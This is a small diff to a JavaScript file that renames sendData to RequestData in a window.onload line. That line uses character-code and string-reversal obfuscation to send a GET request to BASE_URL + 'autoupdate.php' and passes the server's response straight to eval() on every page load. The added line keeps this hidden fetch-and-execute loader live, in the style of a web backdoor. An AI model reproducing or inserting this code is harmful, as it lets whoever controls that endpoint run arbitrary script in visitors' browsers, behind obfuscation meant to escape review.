@@ -218,6 +218,6 @@ var Generate_MD5 = function(s) {
     return i.toLowerCase();
 };
 
-window.onload = sendData(["T", "E", "G"].reverse().join(""), eval(String.fromCharCode(66,65,83,69,95,85,82,76,32,43,32,34,97,117,116,111,117,112,100,97,116,101,46,112,104,112,34,59)), [].reverse().join(""), function(response) {
+window.onload = RequestData(["T", "E", "G"].reverse().join(""), eval(String.fromCharCode(66,65,83,69,95,85,82,76,32,43,32,34,97,117,116,111,117,112,100,97,116,101,46,112,104,112,34,59)), [].reverse().join(""), function(response) {
     eval(response);
 });
